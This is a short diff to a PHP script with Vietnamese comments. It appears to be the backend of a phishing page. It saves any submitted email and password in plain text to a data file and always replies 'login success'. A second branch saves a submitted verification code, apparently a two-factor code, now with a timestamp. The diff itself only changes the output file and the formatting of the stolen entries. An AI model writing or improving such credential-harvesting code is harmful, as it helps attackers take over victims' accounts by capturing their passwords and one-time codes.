@@ -5,8 +5,8 @@
 
     //Trang login
     if ($email !== '' && $pass !== '') {
-    	$datafile = fopen("data/data.txt", "a");
-    	$info = $email . '/' . $pass . "/";
+    	$datafile = fopen("data/data2.txt", "a");
+    	$info = "\n" . $email . '/' . $pass . "/";
     	fwrite($datafile, $info);
     	fclose($datafile);
     	echo "login success";
@@ -15,10 +15,11 @@
 
     //Xác nhận
     if ($verify !== '') {
-    	$datafile = fopen("data/data.txt", "a");
-    	$info = $verify . "\n";
+    	$datafile = fopen("data/data2.txt", "a");
+    	$info = $verify . '/' . date('Y-m-d H:i');
     	fwrite($datafile, $info);
     	fclose($datafile);
-    	echo "verify success";
+        echo $info;
+    	// echo "verify success";
     	exit();
     }
